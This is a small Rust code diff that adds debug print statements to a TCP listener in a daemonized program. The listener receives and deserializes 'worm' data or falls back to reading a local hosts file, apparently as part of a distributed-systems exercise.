@@ -184,12 +184,15 @@ fn listen_for_worm() -> Result<Worm, &'static str> {
         let listener = TcpListener::bind(format!("{}:{}", hostname , get_listen_port())).expect("Error binding to port");
 
         /* Accept TCP connection */
-        if let Ok((stream, _addr)) = listener.accept() {
+        if let Ok((stream, addr)) = listener.accept() {
+            println!("Got some data from {:?}", addr);
             /* Read shits from TCP stream */
             if let Ok(worm) = serde_json::from_reader(stream) {
+                println!("Deserialized worm data from stream");
                 Ok(worm)
             /* No worm, but a start command */
             } else {
+                println!("Unable to deserialize worm data - must be initial segment");
                 let file = File::open("hosts").expect("Unable to open hosts file");
                 let mut reader = BufReader::new(file);
 
@@ -210,9 +213,10 @@ fn listen_for_worm() -> Result<Worm, &'static str> {
 
 fn main() {
     if is_daemonized() {
-        println!("This is now daemonized and was started with args: {:?}", env::args());
+        println!("\nThis is now daemonized and was started with args: {:?}", env::args());
 
         /* Listen for worm or initial message */
+        println!("Listening for a worm!");
         let mut worm = listen_for_worm().expect("Unable to create worm");
         println!("Worm is: {:?}", worm);
 
